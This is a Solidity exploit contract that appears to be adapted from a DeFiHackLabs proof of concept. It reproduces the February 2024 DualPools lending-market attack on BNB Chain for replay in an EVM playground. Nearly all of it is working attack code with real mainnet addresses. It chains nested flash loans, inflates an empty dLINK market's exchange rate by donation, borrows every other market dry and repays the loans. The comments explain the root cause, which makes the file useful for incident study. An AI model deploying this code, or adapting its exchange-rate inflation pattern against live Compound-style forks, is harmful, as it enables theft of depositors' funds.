// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-DualPools).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this), and the DODO/PancakeV2/PancakeV3 flash-loan
// callbacks — DPPFlashLoanCall / pancakeCall / pancakeV3FlashCallback — live on
// the test itself). There is no standalone exploit contract to deploy, so this
// contract is a faithful, self-contained copy of that inline attack (entrypoint
// renamed testAttack -> run) so the playground can deploy and record it.
// Logic and constants are copied verbatim from test/DualPools_exp.sol.
//
// Root cause: DualPools' dLINK money-market (a Venus/Compound fork) prices its
// exchange rate as raw ERC20 balance / totalSupply. The dLINK market was empty,
// so minting 2 wei of dLINK then donating 11,500 LINK via a plain transfer (not
// mint) inflates the exchange rate to 5.75e39. The comptroller values the 2 wei
// of dLINK as ~11,500 LINK of collateral, which is used to borrow every other
// DualPools market dry; redeemUnderlying() then recovers the donation because
// redeemTokens = amount / exchangeRate truncates to 1.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface WETH9 {
    function withdraw(uint256 wad) external;
    function deposit() external payable;
    function transfer(address dst, uint256 wad) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IMarketFacet {
    function enterMarkets(address[] calldata vTokens) external returns (uint256[] memory);
}

interface VBep20Interface {
    function balanceOf(address owner) external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function mint() external payable;
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow(uint256 repayAmount) external returns (uint256);
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface Uni_Pair_V3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract DualPoolsDrain {
    WETH9 private constant WBNB = WETH9(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant LINK = IERC20(0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD);
    IERC20 private constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);

    VBep20Interface private constant vLINK = VBep20Interface(0x650b940a1033B8A1b1873f78730FcFC73ec11f1f);
    VBep20Interface private constant vBUSD = VBep20Interface(0xfD5840Cd36d94D7229439859C0112a4185BC0255);
    VBep20Interface private constant vWBNB = VBep20Interface(0xA07c5b74C9B40447a954e1466938b865b6BBea36);

    VBep20Interface private constant dLINK = VBep20Interface(0x8fBCC81E5983d8347495468122c65E2Dc274eed9);
    VBep20Interface private constant dBTCB = VBep20Interface(0xB51F589BD9f69a0089c315521EE2FC848bAB6C0c);
    VBep20Interface private constant dWBNB = VBep20Interface(0xB5aAaCcFd69EA45b1A5Aa7E9c7a5e0DB2ce4357e);
    VBep20Interface private constant dETH = VBep20Interface(0x5F4a5252880b393a8cc4c01bBA4486Cf7a76075A);
    VBep20Interface private constant dADA = VBep20Interface(0xb2cf43E119BFC41554c4445f1867dc9F4cf69deD);
    VBep20Interface private constant dBUSD = VBep20Interface(0x514e2A29e98D49C676c93c5805cb83891CE6a9F5);

    IMarketFacet private constant VenusProtocol = IMarketFacet(0xfD36E2c2a6789Db23113685031d7F16329158384);
    IMarketFacet private constant Dualpools = IMarketFacet(0x5E5e28029eF37fC97ffb763C4aC1F532bbD4C7A2);

    IDPPOracle private constant DPPOracle_0x1b52 = IDPPOracle(0x1B525b095b7353c5854Dbf6B0BE5Aa10F3818FaC);
    IDPPOracle private constant DPPOracle_0x8191 = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);

    IPancakePair private constant pancakeSwap = IPancakePair(0x824eb9faDFb377394430d2744fa7C42916DE3eCe); // LINK-WBNB
    Uni_Pair_V3 private constant pool = Uni_Pair_V3(0x172fcD41E0913e95784454622d1c3724f546f849);

    // step 0: approve the money markets, then flash-loan BUSD from DODO to fund the attack.
    function run() external {
        BUSD.approve(address(vBUSD), type(uint256).max);
        LINK.approve(address(vLINK), type(uint256).max);
        LINK.approve(address(dLINK), type(uint256).max);

        DPPOracle_0x1b52.flashLoan(7_001_000_000_000_000_000, 0, address(this), new bytes(1)); // borrow BUSD
    }

    // DODO flash-loan callback (both DPP pools call back through this dispatcher).
    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata data) external {
        if (msg.sender == address(DPPOracle_0x1b52)) {
            pancakeSwap.swap(0, 1000, address(this), data); // pancakeCall, swap BUSD to LINK
            BUSD.transfer(address(DPPOracle_0x1b52), 7_001_000_000_000_000_000);
        } else if (msg.sender == address(DPPOracle_0x8191)) {
            pool.flash(address(this), 70_000_000_000_000_000_000_000, 0, new bytes(1)); // v3 flash, borrow BUSD
            WBNB.transfer(address(pancakeSwap), 59);
        }
    }

    // PancakeSwap V2 swap callback.
    function pancakeCall(address, uint256, uint256, bytes calldata data) external {
        DPPOracle_0x8191.flashLoan(312_497_349_377_117_598_837, 154_451_704_908_346_387_787_280, address(this), data); // borrow WBNB and BUSD
    }

    // PancakeSwap V3 flash callback — this is where the DualPools exploit runs.
    function pancakeV3FlashCallback(uint256, uint256, bytes calldata) external {
        address[] memory tokenList = new address[](2);
        tokenList[0] = address(vBUSD);
        tokenList[1] = address(vWBNB);
        VenusProtocol.enterMarkets(tokenList);
        vBUSD.mint(224_451_704_908_346_387_787_280); // seed Venus collateral
        WBNB.withdraw(312_497_349_377_117_598_837);
        vWBNB.mint{value: 312_497_349_377_117_598_837}(); // seed Venus collateral
        vLINK.borrow(11_500_000_000_000_000_000_000); // borrow 11,500 LINK from real Venus

        // --- the DualPools exploit ---
        dLINK.mint(2); // deposit 2 wei LINK into the EMPTY dLINK market -> totalSupply = 2
        LINK.transfer(address(dLINK), 11_499_999_999_999_999_999_998); // DONATION (not mint): cash jumps to 11,500e18, totalSupply stays 2
        // exchangeRate = cash * 1e18 / totalSupply = 11,500e18 * 1e18 / 2 = 5.75e39

        address[] memory tokenList1 = new address[](1);
        tokenList1[0] = address(dLINK);
        Dualpools.enterMarkets(tokenList1); // 2 dLINK now counts as ~11,500 LINK (~$231K) of collateral

        // borrow every other DualPools market dry against the phantom collateral
        dWBNB.borrow(50_074_555_376_020_317_788);
        dBTCB.borrow(171_600_491_170_058_684);
        dETH.borrow(3_992_080_357_935_675_366);
        dADA.borrow(6_378_808_489_713_884_698_357);
        dBUSD.borrow(911_577_468_904_829_524_350);

        // redeemTokens = redeemAmount / exchangeRate = 11,500e18 / 5.75e39 = 1 (truncated)
        // -> recovers the whole 11,500 LINK donation for the price of 1 dLINK share
        dLINK.redeemUnderlying(11_499_999_999_999_999_999_898);

        // unwind the Venus side-loop
        vLINK.repayBorrow(11_500_000_000_000_000_000_000);
        vBUSD.redeem(969_266_514_517_797);
        vWBNB.redeem(1_320_879_335_222);

        // repay the nested flash loans
        BUSD.transfer(address(DPPOracle_0x8191), 154_451_704_908_346_387_787_280);
        BUSD.transfer(address(pool), 70_007_000_000_000_000_000_000);

        WBNB.deposit{value: 362_571_904_345_528_150_166}();
        WBNB.transfer(address(DPPOracle_0x8191), 312_497_349_377_117_598_837);
    }

    receive() external payable {}
    fallback() external payable {}
}
